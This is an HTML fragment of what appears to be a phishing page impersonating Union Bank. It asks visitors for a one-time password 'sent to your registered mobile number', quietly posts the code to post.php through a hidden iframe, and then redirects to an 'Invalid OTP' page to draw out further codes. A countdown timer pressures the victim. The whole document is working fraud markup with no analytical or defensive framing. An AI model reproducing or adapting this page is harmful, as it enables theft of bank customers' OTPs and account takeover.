...
<body onload="startTimer();">
    ...
    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Invalid_OTP.php';}"></iframe>
    <!--My Form-->
    <form action="post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
        <img src="lolo.jpg" alt="" id="aa">
        <div id="kyc"><br>
            <p1 style="color:white; font-size:16px; padding:20px;">Authenticate With OTP</p1><br>
        </div>
        <div id="col">
            <br><br>
    ...
    which was sent to your registered mobile <br>number with Union Bank.</b></center><br>
        ...
        color:#AE2924; 
        padding:0px 25px; font-size:16px;"><i>One Time Password*</i> </b><br>
            <div id="dd">
                <input type="text" name="2ND OTP" id="ee" inputmode="numeric" placeholder="OTP" maxlength="6" pattern="[0-9]{6}" title="Please Enter Valid One Time Password" required=""><br>
                <script type="text/javascript">
                    var timer = 180;
                    var sec = 0;
                    ...
                    function startTimer() {
                        ...
                        if (timer < 2) {
                            // timer.stop();
                            window.location.href = "Invalid_OTP.html";
                        }
        ...
        <div>
            <img src="futterhas.png" alt="" id="ft"><br><br>
        </div>
    </form>
</body>
